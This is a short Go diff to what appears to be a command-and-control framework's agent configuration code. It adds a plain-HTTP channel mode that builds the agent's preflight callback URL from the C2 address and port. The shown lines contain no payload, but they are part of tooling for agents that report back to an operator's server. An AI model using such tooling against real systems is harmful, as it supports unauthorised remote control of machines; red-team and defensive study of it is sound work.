@@ -157,13 +157,22 @@ func MakeConfig(opts AgentConfig) error {
 	// Preflight / Hybrid Mode intervals
 	if live.RuntimeConfig.PreflightURL == "" {
 		// generate new if empty
-		live.RuntimeConfig.PreflightURL = fmt.Sprintf("https://%s:%s/%s", live.RuntimeConfig.CCAddress, live.RuntimeConfig.CCH2Port, util.RandStr(util.RandInt(5, 10)))
+		if live.RuntimeConfig.C2ChannelMode == def.C2ChannelModePlainHTTP {
+			live.RuntimeConfig.PreflightURL = fmt.Sprintf("http://%s:%s/%s", live.RuntimeConfig.CCAddress, live.RuntimeConfig.CCHTTPPort, util.RandStr(util.RandInt(5, 10)))
+		} else {
+			live.RuntimeConfig.PreflightURL = fmt.Sprintf("https://%s:%s/%s", live.RuntimeConfig.CCAddress, live.RuntimeConfig.CCH2Port, util.RandStr(util.RandInt(5, 10)))
+		}
 	} else {
 		// synchronise host and port with CCAddress
 		u, err := url.Parse(live.RuntimeConfig.PreflightURL)
 		if err == nil {
-			u.Host = fmt.Sprintf("%s:%s", live.RuntimeConfig.CCAddress, live.RuntimeConfig.CCH2Port)
-			u.Scheme = "https"
+			if live.RuntimeConfig.C2ChannelMode == def.C2ChannelModePlainHTTP {
+				u.Host = fmt.Sprintf("%s:%s", live.RuntimeConfig.CCAddress, live.RuntimeConfig.CCHTTPPort)
+				u.Scheme = "http"
+			} else {
+				u.Host = fmt.Sprintf("%s:%s", live.RuntimeConfig.CCAddress, live.RuntimeConfig.CCH2Port)
+				u.Scheme = "https"
+			}
 			live.RuntimeConfig.PreflightURL = u.String()
 		}
 	}
